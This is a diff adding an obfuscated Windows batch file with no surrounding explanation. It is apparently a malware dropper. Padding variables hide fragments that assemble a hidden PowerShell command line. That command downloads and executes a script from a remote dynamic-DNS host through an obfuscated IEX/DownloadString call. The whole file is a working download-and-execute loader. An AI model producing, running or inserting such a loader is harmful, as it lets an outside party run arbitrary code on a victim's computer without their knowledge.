@@ -1,0 +1,45 @@
+@echo off
+cd %SystemRoot%\System32
+set q=Q1_2p7_1t2W2B7dJtKSGhWBR
+set r=_8_2J8Q0_1g3_6JyVsdTbmeR
+set s=f5K4k3j3H1G4_0puXmXiduIP
+set t=_4E4Z3X2_4_3R0qtfwxOmtYr
+set u=t3f3S2l7_1G9_8iHjNaKbKHt
+set v=_9_0b8_4_8G6h1fcRRbbqbse
+set x=r8_2_2_3M0_7N5oZHLNgDJDr
+set y=_8H4M8q3_7_8V9jjUCOGgkXq
+set z=_0c4D2_9_2_0G4auyRejawPO
+set a=Win
+set za=u8e4o7_6t2_4a7etcexMKoIK
+set b=dow
+set ze=_7_0s5Q2_4_1_8XsCVXXyAhk
+set c=sPo
+set ze=_1_5_1_5_3_5_4GnagfcewaT
+set d=wer
+set ze=x4M3_5u5x1l6_0HCLCNceWSf
+set e=She
+set ze=_7_1S5_4_0j9h7UzrlcZYKXy
+set f=ll\
+set ze=_7_7_7_5m8t2U0OSmtUpCWcr
+set g=v1.
+set ze=_0Q2Y3K2_9W5_4KbkWbkYvvO
+set h=0\po
+set ze=p7_1_6_1_7h1_8AysDJqdfIg
+set i=we
+set ze=_4_9Y0_4_7J9y2mSiRarBYXo
+set j=rsh
+set ze=T4_8_9_4_5_1y1EFRlsTRdwb
+set k=ell
+set ze=_9T6V0_2_4_1J0eRjRolATcB
+set l=.ex
+set ze=Q9_1E9_9_3s6_5KhGLmhtUpB
+set m=e -n
+set ze=_0l9_6H9O8_3p3NnCBuzkIod
+set n=op 
+set ze=_1V4_8_2A2_1Z6JJKgpeDTmG
+set o=-w
+set ze=q1z2r0_5Z7l5a3tyhiczluNW
+set p=in 1 -
+set ze=Z9h6y5_4D0Y2o4sfOBAMvasH
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('http://pan10.bounceme.net/K5t8u3_9s7_4_9sJJpn/K5t8u3_9s7_4_9sJJ/K5t8u3_9s7_4_9sJJnn/K5t8u3_9s7_4_9sJJ')"); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
+set ze=f2_4_9R1C7Y6s0lzaHZkiiAK
